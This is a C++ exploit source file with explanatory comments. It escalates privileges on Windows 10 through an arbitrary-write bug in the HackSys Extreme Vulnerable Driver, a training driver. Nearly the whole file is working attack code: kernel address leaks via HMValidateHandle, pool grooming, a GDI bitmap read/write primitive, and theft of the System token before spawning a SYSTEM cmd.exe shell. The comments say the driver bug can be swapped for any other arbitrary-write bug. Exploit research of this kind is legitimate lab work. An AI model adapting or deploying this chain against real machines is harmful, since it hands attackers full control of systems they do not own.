
/*
	GdiExp.cc
	
	this module make's use of the gdi objects SetBitmapBits & GetBitmapBits in order
	to overwrite the current process token (security descriptor) with the System's
	Token. this compromises the system becouse then the thread can do as he wants on the target machine.
	
	the overwrite works as follows:
	We got two objects, WorkerBitmap & ManagerBitmap (named for convenience).
	
	The SetBitmapBits function sets the bits of color data for a bitmap to the specified values.
	The GetBitmapBits function copies the bitmap bits of a specified device-dependent bitmap into a buffer.
	
	with any arbitrary overwrite bug we can overwrite the pvScan0 pointer of one of the gdi objects
	to point to the other object pvScan0, with that we can later use setbitmapbits with the worker to change the value
	that this pointer points to.
	
	so we can set the pointer to any arbitrary location (evan in kernel) and then, use SetBitmapBits
	with the manager to get arbitrary write to the kernel or GetBitmapBits to read from kernel space.
	
	___________   SetBitmapBits
	|pvScan0   |\
	|          |  \
	|__________|    \(arbitrary address)
			|pvScan0   |\
			|          |  \
	<---------------|          |    \ arbitrary value, Write Operation.
	 GetBitmapBits
	 ArbitraryRead.
	
	
	we need to leak lpszMenuName using HMValidateHandle, that is allocated on the same pool region
	as the bitmap object, in order to later use in an arbitrary overwrite bug.
	using SeBitmapBits & GetBitmapBits as w/r op.
	Ref:
	https://github.com/FuzzySecurity/HackSysTeam-PSKernelPwn/blob/master/Kernel_RS2_WWW_GDI_64.ps1
	https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
	Win32k Dark Composition: Attacking the Shadow part of Graphic subsystem <= 360Vulcan
	LPE vulnerabilities exploitation on Windows 10 Anniversary Update <= Drozdov Yurii & Drozdova Liudmila
	
<---- 
 
	Copy & usage of this software are allowed without any restrictions.
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
	IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
	LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
	OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
	SOFTWARE.
	
 ---->
*/



#pragma once
#include "stdafx.h"
#include <Windows.h>
#include <stdio.h>
#include <cstdint>
#include <conio.h>

#pragma comment(lib, "Gdi32.lib")

#include <Wingdi.h>

#define hDev "\\\\.\\HacksysExtremeVulnerableDriver"

/*
	HMValidateHandle is not an exported function, becouse of that we need to
	menually find its address and call it by stdcall convention from its memory pointer
	so its needed to define this function as void ptr to later call it.
*/
typedef void*(NTAPI *lHMValidateHandle)(
	HWND h,
	int type
);

/*
	it is usefull to declare such an object, to leak lpszMenuName is not very
	reliable so is better to create object and populate them accordingly in close proximty to
	destroying the window object that is allocated in the same pool region.
*/

typedef struct _hBmp {
	HBITMAP hBmp;
	DWORD64 kAddr;
	PUCHAR pvScan0;
} HBMP, *PHBMP;

/*
	to create a window object we need to set a main method
	other wise allocation will fail.
*/

LRESULT
CALLBACK MainWProc(
	HWND hWnd, UINT uMsg,
	WPARAM wParam, LPARAM lParam
)
{
	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}

lHMValidateHandle pHmValidateHandle = NULL;

// REF:
// https://github.com/sam-b/windows_kernel_address_leaks/blob/master/HMValidateHandle/HMValidateHandle/HMValidateHandle.cpp
BOOL
GetHMValidateHandle(
)
{
	/*
		we need to menually search user32.dll
		near the "IsMenu" entry and make comprehension
		to start of the function signature in order to get the pointer to
		HMValidateHandle function, that can be used to retrieve memory location's of
		later allocated window objects.
	*/
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		exit(GetLastError());
	}

	BYTE* pIsMenu = (BYTE *)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		exit(GetLastError());
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i < 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xe8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		exit(GetLastError());
	}

	unsigned int addr = *(unsigned int *)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;
	pHmValidateHandle = (lHMValidateHandle)((ULONG_PTR)hUser32 + offset + 11);
	return TRUE;
}


/*
	we need to get ntoskernel base address in order to compute the PsInitialSystemProcess
	that points to System's _EPROCESS structure.
	we use ZwQuerySystemInformation, and this is only from medium integrity level
	on windows 10, but this can be replaced by a kernel leak, see BHUSA2017 morten schenk's
	presentations for more information.
*/
PUCHAR
GetNtos(
)
{
	typedef enum _SYSTEM_INFORMATION_CLASS {
		SystemBasicInformation = 0,
		SystemPerformanceInformation = 2,
		SystemTimeOfDayInformation = 3,
		SystemProcessInformation = 5,
		SystemProcessorPerformanceInformation = 8,
		SystemModuleInformation = 11,
		SystemInterruptInformation = 23,
		SystemExceptionInformation = 33,
		SystemRegistryQuotaInformation = 37,
		SystemLookasideInformation = 45
	} SYSTEM_INFORMATION_CLASS;

	typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
		HANDLE Section;
		PVOID MappedBase;
		PVOID ImageBase;
		ULONG ImageSize;
		ULONG Flags;
		USHORT LoadOrderIndex;
		USHORT InitOrderIndex;
		USHORT LoadCount;
		USHORT OffsetToFileName;
		UCHAR FullPathName[256];
	} SYSTEM_MODULE_INFORMATION_ENTRY, *PSYSTEM_MODULE_INFORMATION_ENTRY;

	typedef struct _SYSTEM_MODULE_INFORMATION {
		ULONG NumberOfModules;
		SYSTEM_MODULE_INFORMATION_ENTRY Module[1];
	} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

	typedef NTSTATUS(__stdcall *pfZwQuerySystemInformation)(
		SYSTEM_INFORMATION_CLASS SystemInformationClass,
		PVOID SystemInformation,
		ULONG SystemInformationLength,
		PULONG ReturnLength
	);

	DWORD len;
	PSYSTEM_MODULE_INFORMATION ModuleInfo;
	PVOID Nt = NULL;
	pfZwQuerySystemInformation ZwQuerySystemInformation = (pfZwQuerySystemInformation)GetProcAddress(
		GetModuleHandle(L"ntdll.dll"), "ZwQuerySystemInformation");
	ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);
	ModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
		NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo) { return NULL; }
	ZwQuerySystemInformation(SystemModuleInformation, ModuleInfo, len, &len);
	Nt = ModuleInfo->Module[0].ImageBase;
	VirtualFree(ModuleInfo, 0, MEM_RELEASE);
	return (PUCHAR)Nt;
}

/*
	we load ntoskernel inuser space to compute PsInitialSystemProcess
	&PsInitialSystemProcess = NtoskrnlKernelBaseAddress + UserPsInitialSystemProcess - UserNtoskrnlBaseAddress
*/
DWORD64
GetPsInitialSystemProcess(
)
{
	PUCHAR NtBaddr = (PUCHAR)GetNtos();
	printf("[+] ntoskrnl Base Addr: %p\n", NtBaddr);
	PUCHAR ntos = (PUCHAR)LoadLibrary(L"ntoskrnl.exe");
	PUCHAR addr = (PUCHAR)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	auto Psi = addr - ntos + NtBaddr;
	printf("[+] PsInitialSystemProcess: %p\n", Psi);
	return (DWORD64)Psi;
}

/*
	create window object that is allocated in the same pool region like the bitmap object,
	to leak its pointer, then allocate a bitmap object with big byte array so they are both on close size,
	and leak maybe more reliable.
*/

ATOM
RegisterhWnd(
	LPCWSTR class_name,
	LPCWSTR menu_name
	)
{
	WNDCLASS wind_class = WNDCLASS();
	wind_class.lpszClassName = class_name;
	wind_class.lpszMenuName = menu_name;
	wind_class.lpfnWndProc = MainWProc;
	return RegisterClassW(&wind_class);
}

void
DestroyWnd(
	HWND hWnd
	) 
{
	DestroyWindow(hWnd);
	UnregisterClassW(L"aaa",NULL);  // destroy object to free memory to allocate the gdi obj.
}

HWND
CreateWindowObject(
	) 
{
	WCHAR* Buff = new WCHAR[0x8F0];
	RtlSecureZeroMemory(Buff, 0x8F0);  // create big window object to make entropy small.
	RtlFillMemory(Buff, 0x8F0, '\x41');
	ATOM Cls = RegisterhWnd(L"aaa" ,Buff);
	return CreateWindowExW(0, L"aaa", NULL, 0, 0, 0, 0, 0, 0, 0, NULL, 0);
}

DWORD64
LeaklpszMenuName(
	HWND hWnd
	) 
{
	DWORD64 pCLSOffset = 0xa8;
	DWORD64 lpszMenuNameOffset = 0x90;  // Calculate the ulClientDelta to compute the object kernel bAddr
	BOOL bRet = GetHMValidateHandle(); // using the previously found HMValidateHandle function pointer.
	void* lpUserDesktopHeapWindow = pHmValidateHandle(hWnd, 1);
	uintptr_t ulClientDelta = *reinterpret_cast<DWORD64 *>((DWORD64*)(lpUserDesktopHeapWindow) +0x20) - (
		DWORD64)(lpUserDesktopHeapWindow);
	uintptr_t KerneltagCLS = *reinterpret_cast<DWORD64 *>((DWORD64)lpUserDesktopHeapWindow+ pCLSOffset);
	DWORD64 lpszMenuName = *reinterpret_cast<DWORD64 *>(KerneltagCLS - ulClientDelta + lpszMenuNameOffset);
	return lpszMenuName;
}

/*
	continuously allocate and destroy windows objects until we get the same results
	for the lpszMenuName pointer address to make exploit more reliable.
	after leak, destoy the window object and allocate the bitmap instead.
*/

BOOL
Leak(
	int y,
	HBMP &hbmp  // you have to pass a reference other-wise the compiler will
		    // create a new object and that is very bad.
	)
{
	
	DWORD64 Curr, Prev = NULL;

	for (int i = 0; i <= 200; i++) { // This is unstable, need a fix...
					// the ulClientDelta is dancing beetwin values
					// & it makes the exploit unstable it a one out of 15...
		HWND TestWindowHandle = CreateWindowObject();
		Curr = LeaklpszMenuName(TestWindowHandle);
		if (1<=i) {
			if (Curr == Prev) {
				DestroyWnd(TestWindowHandle);
				WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
				RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
				RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
				hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
				hbmp.kAddr = Curr;
				hbmp.pvScan0 = (PUCHAR)(Curr + 0x50);
				return TRUE;
			}
		}
		DestroyWnd(TestWindowHandle);
		Prev = Curr;
	}

	WCHAR* Buff = new WCHAR[0x50 * 2 * 4];
	RtlSecureZeroMemory(Buff, 0x50 * 2 * 4);
	RtlFillMemory(Buff, 0x50 * 2 * 4, '\x41');
	hbmp.hBmp = CreateBitmap(0x701, 2, 1, 8, Buff);
	hbmp.kAddr = Curr;
	hbmp.pvScan0 = (PUCHAR)(Curr + 0x50);

	return TRUE;
}

DWORD64
BitmapArbitraryRead(
	HBITMAP &Mgr, // Send a ref same reason as above.
	HBITMAP &Wrk,
	DWORD64 addr
)
{

	LPVOID bRet = VirtualAlloc(
		0, sizeof(addr),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	//
	// we want to read from arbitrary location, so set the manager bits to 
	// address we want to read, then get the values with the worker.
	//
	
	auto m = SetBitmapBits(Mgr, sizeof(addr), (LPVOID *)&addr);
	if (m == 0) {
		printf("error setting bits!");
	}

	if (GetBitmapBits(Wrk, sizeof(bRet), bRet) == NULL) {
		printf("err");
	}
	auto retV = *((DWORD64 *)bRet);
	VirtualFree( bRet, sizeof(bRet), MEM_FREE | MEM_RELEASE );
	return retV;
}

DWORD64 BitmapArbitraryWrite(
	HBITMAP &Mgr,
	HBITMAP &Wrk,
	DWORD64 addr,
	DWORD64 Val
	) 
{

	// Same but only set values (for writing).
	
	SetBitmapBits(Mgr, 8, (LPVOID *)&addr);

	if (SetBitmapBits(Wrk, 8, &Val) == 0) {
		return -1;
	}
	return(0);
}

/*
	Main Logic.
*/

int
main(
)
{

	printf("\n[!] gdi feng shui ..\n");
	printf("[>] Spraying the pool\n");
	printf("[>] leaking ulClientDelta...\n");
	// first create object (memory structure's alone), so only when window object is
	// deleted then allocate bitmap,
	// we only get pointers then bck from leak function.
	HBMP managerBitmap;
	HBMP workerBitmap;
	if (!Leak(0, managerBitmap)) {
		exit(GetLastError());
	}
	if (!Leak(1, workerBitmap)) {
		exit(GetLastError());
	}
	
	printf("\n[+] pHmValidateHandle: %p \n", pHmValidateHandle);
	printf("[+] hMgr: %p\n", &managerBitmap.hBmp);
	printf("[+] hWorker: %p\n", &workerBitmap.hBmp);
	printf("[+] Mgr pvScan0 offset: %p\n", managerBitmap.kAddr & -0xfff);
	printf("[+] Wrk pvScan0 offset: %p\n", workerBitmap.kAddr & -0xfff);

	// for debug.
	//getch();

	
	// this is the arbitrary overwrite bug in the HEVD driver,
	// this ofc can be replaced by any other bug.
	byte Buff[sizeof(LPVOID) * 2] = { 0 };

	LPVOID wPtr = VirtualAlloc(0, sizeof(LPVOID), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	memcpy(wPtr, &workerBitmap.pvScan0, sizeof(LPVOID));
	memcpy(Buff, &wPtr, sizeof(LPVOID));
	memcpy(Buff + sizeof(LPVOID), &managerBitmap.pvScan0, sizeof(LPVOID));

	DWORD u = 0;

	auto dev = CreateFileA(
		hDev,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (dev == INVALID_HANDLE_VALUE) { 
		exit(GetLastError()); }

	printf("\n[>] ldr\n");
	printf("[+] Opened Device Handle at: %p\n", &dev);
	printf("[+] Device Name: %s\n", hDev);
	printf("[+] Sending Ioctl: %p\n", 0x22200B);
	printf("[+] Buffer length: %d\n", sizeof(LPVOID) * 2);

	auto bResult = DeviceIoControl(
		dev,	
		0x22200B,						
		Buff,					
		sizeof(Buff),			
		NULL, 0,						
		&u,							
		(LPOVERLAPPED)NULL
	);

	if (!bResult) {
		CloseHandle(dev);
		exit(GetLastError());
	}

	CloseHandle(dev);

	DWORD64 EpPtr = GetPsInitialSystemProcess();
	printf("\n[!] running exploit...\n\n\n");
	
	// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
	// 
	// This is ShellCode Time, i take asseambly used b4 to make C shellcode.
	// READ asseambly for ref...
	//
	//
	// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
/*

	This is The ShellCode used to OverWrite The Token...
	it worked in the asseambly so no reason it wont work here...

;; kd> dps gs:188 l1
;;  nt!KiInitialThread
mov rax, [gs:0x188]
mov rax, [rax+0xb8]
;; kd> dt nt!_EPROCESS poi(nt!KiInitialThread+b8)
;;   +0x000 Pcb              : _KPROCESS
;;   [...]
;;   +0x2e0 UniqueProcessId  : 0x00000000`00000004 Void
;;   +0x2e8 ActiveProcessLinks : _LIST_ENTRY
;;   [...]
;;  +0x358 Token            : _EX_FAST_REF
;;
;; place KiInitialThread+b8
;; in rbx.
mov rbx, rax
loop:
mov rbx, [rbx+0x2e8]    ;; Get the next process
sub rbx, 0x2e8
mov rcx, [rbx+0x2e0]	;; place process in rcx
cmp rcx, 4		;; Compare to System pid.
jnz loop
mov rcx, [rbx + 0x358]
and cl, 0xf0		;; Null the token
mov [rax + 0x358], rcx
	
	
*/

	DWORD64 SystemEP = BitmapArbitraryRead(
		managerBitmap.hBmp, workerBitmap.hBmp, EpPtr);
	if (SystemEP == -1) {
		return -1;
	}


	DWORD64 TokenPtr = SystemEP + 0x358; 
	DWORD64 SysToken = BitmapArbitraryRead(
		managerBitmap.hBmp, workerBitmap.hBmp, TokenPtr);
	if (SysToken == -1) {
	}
	printf("System TOKEN: %p\n", SysToken);

	DWORD PID = GetCurrentProcessId(); 
	DWORD64 NextEpPtr = BitmapArbitraryRead(
		managerBitmap.hBmp, workerBitmap.hBmp, (
		((DWORD64)SystemEP) + ((DWORD64)0x2e8))) - 0x2e8;


	DWORD64 CurrentToken = 0;


	while (TRUE) {

		DWORD64 NextProcessPID = BitmapArbitraryRead(
			managerBitmap.hBmp, workerBitmap.hBmp, ((DWORD64)NextEpPtr + 0x2e0));
		if (NextProcessPID == PID) { 
			CurrentToken = BitmapArbitraryRead(
				managerBitmap.hBmp, workerBitmap.hBmp, ((DWORD64)NextEpPtr + 0x358));
			printf("Our TOKEN: %p\n\n\n", CurrentToken);
			break;
		}
		NextEpPtr = BitmapArbitraryRead(
			managerBitmap.hBmp, workerBitmap.hBmp, (
			(DWORD64)NextEpPtr + 0x2e8)) - 0x2e8;
	}
	
	/*
	
		i dont know i see many ppl not dereference the system token b4 replacing token,
		i never got success without this.
		i also read two problems when not making dereference b4 replace
		you can read this as a ref:
		https://github.com/hfiref0x/CVE-2015-1701/issues/2
		https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp#L257
	*/
	

	BitmapArbitraryWrite(managerBitmap.hBmp, workerBitmap.hBmp, (
		(DWORD64)NextEpPtr + 0x358), ((DWORD64)SysToken & -0xf)); // Null The Damn Ref_count...

	// if we got here (hit break on endless loop we are allready system so create cmd session.)
	
	system("cmd.exe");
	return 0;
}

/*
	for any inaccuracies please write to me,
	twitter: @_akayn
	Cheers!
*/








